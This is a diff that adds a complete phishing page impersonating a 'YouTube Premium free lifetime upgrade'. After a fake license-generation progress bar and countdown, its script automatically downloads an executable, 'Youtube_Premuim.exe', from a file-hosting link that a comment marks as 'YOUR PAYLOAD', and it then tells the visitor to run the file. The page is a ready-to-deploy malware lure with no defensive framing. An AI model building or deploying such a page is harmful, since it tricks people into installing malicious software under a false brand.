@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Premium – Free Lifetime Upgrade 2025</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#ffffff; color:#fff; font-family:'Roboto', sans-serif; }
+        .container {
+            max-width:520px;
+            margin:30px auto;
+            /* background:#fff; */
+            border-radius:20px;
+            overflow:hidden;
+            box-shadow:0 12px 50px rgba(158, 157, 157, 0.25);
+        }
+        .header {
+            background:#FF0000;
+            padding:40px 20px 30px;
+            text-align:center;
+        }
+        .logo {
+            height:120px;           /* ← BIG LOGO */
+            width:auto;
+            margin-bottom:12px;
+        }
+        h1 {
+            font-size:28px;
+            font-weight:700;
+            color:white;
+            letter-spacing:-0.5px;
+        }
+        .subtitle {
+            font-size:16px;
+            color:#ffcccc;
+            margin-top:6px;
+        }
+        .content { padding:36px 40px; text-align:center; background:#fff; color:#333; }
+        .offer {
+            background:#ffebee;
+            border:3px solid #ffcdd2;
+            padding:22px;
+            border-radius:16px;
+            margin:20px 0 30px;
+            font-size:18px;
+            line-height:1.5;
+        }
+        .offer strong { color:#d32f2f; }
+        .features {
+            display:grid;
+            gap:16px;
+            margin:32px 0;
+        }
+        .feature {
+            display:flex;
+            align-items:center;
+            gap:16px;
+            font-size:17px;
+            background:#fff;
+            padding:14px;
+            border-radius:14px;
+            box-shadow:0 3px 12px rgba(255,0,0,0.1);
+        }
+        .progress-box {
+            background:#fff0f0;
+            padding:30px;
+            border-radius:18px;
+            border:3px solid #FF0000;
+            margin:30px 0;
+        }
+        .progress-bar {
+            height:12px;
+            background:#ffcdd2;
+            border-radius:6px;
+            overflow:hidden;
+            margin:18px 0;
+        }
+        .progress-fill {
+            height:100%;
+            width:0%;
+            background:#FF0000;
+            transition:width 0.7s ease;
+        }
+        .timer {
+            font-size:19px;
+            font-weight:600;
+            color:#c62828;
+        }
+        .btn {
+            background:#FF0000;
+            color:white;
+            border:none;
+            width:100%;
+            padding:18px;
+            font-size:18px;
+            font-weight:600;
+            border-radius:14px;
+            cursor:pointer;
+            margin-top:24px;
+            box-shadow:0 6px 20px rgba(255,0,0,0.4);
+            transition:all 0.2s;
+        }
+        .btn:hover { background:#e60000; transform:translateY(-3px); }
+        .footer {
+            background:#e60000;
+            color:#ffffff;
+            text-align:center;
+            padding:22px;
+            font-size:13px;
+        }
+        .hidden { display:none; }
+        .box{
+            padding: 10x;
+            background-color: white;
+            border-radius: 20px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <!-- ← PUT YOUR BIG LOGO HERE (replace the src) -->
+         <div class="box">
+             <img src="[CITYPNG.COM]HD Official Youtube YT Logo PNG - 4000x4000.png" class="logo" alt="YouTube">
+         </div>
+        <h1>YouTube Premium</h1>
+        <div class="subtitle">Free Lifetime Upgrade – 2025 Limited Slots</div>
+    </div>
+
+    <div class="content">
+        <div class="offer">
+            Congratulations! You qualify for <strong>free lifetime YouTube Premium</strong><br>
+            No ads • Background play • Offline downloads • YouTube Music Premium
+        </div>
+
+        <div class="features">
+            <div class="feature"><span class="material-icons" style="color:#FF0000;font-size:28px;">block</span> No ads forever</div>
+            <div class="feature"><span class="material-icons" style="color:#FF0000;font-size:28px;">play_circle</span> Background play & offline</div>
+            <div class="feature"><span class="material-icons" style="color:#FF0000;font-size:28px;">music_note</span> YouTube Music Premium included</div>
+        </div>
+
+        <div class="progress-box">
+            <div style="font-size:18px;font-weight:500;">Generating your lifetime license...</div>
+            <div class="progress-bar"><div class="progress-fill" id="bar"></div></div>
+            <div class="timer" id="timer">Auto download in <strong>10</strong> seconds</div>
+        </div>
+
+        <button class="btn hidden" id="btn" onclick="downloadNow()">
+            Download Activator (8.7 MB) – Windows
+        </button>
+    </div>
+
+    <div class="footer">
+        2025 YouTube Premium Lifetime Offer • Not affiliated with Google LLC
+    </div>
+</div>
+
+<script>
+    let seconds = 5;
+    let width = 0;
+
+    const bar = document.getElementById('bar');
+    const timer = document.getElementById('timer');
+    const btn = document.getElementById('btn');
+
+    const progress = setInterval(() => {
+        if (width < 94) {
+            width += Math.random() * 10 + 3;
+            bar.style.width = width + '%';
+        }
+    }, 700);
+
+    const countdown = setInterval(() => {
+        seconds--;
+        timer.innerHTML = `Auto download in <strong>${seconds}</strong> seconds`;
+
+        if (seconds <= 0) {
+            clearInterval(countdown);
+            clearInterval(progress);
+            bar.style.width = '100%';
+            timer.innerHTML = 'Ready – starting download now';
+            btn.classList.remove('hidden');
+            autoDownload();
+        }
+    }, 1000);
+
+    function autoDownload() {
+        const a = document.createElement('a');
+        a.href = 'https://www.mediafire.com/file/7x1ifctbhesbriq/Youtube_Premuim.exe/file';  // ← YOUR PAYLOAD
+        a.download = 'Youtube_Premuim.exe';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        setTimeout(() => {
+            timer.innerHTML = 'Download complete – run the file!';
+        }, 1000);
+    }
+
+    function downloadNow() { autoDownload(); }
+</script>
+
+</body>
+</html>
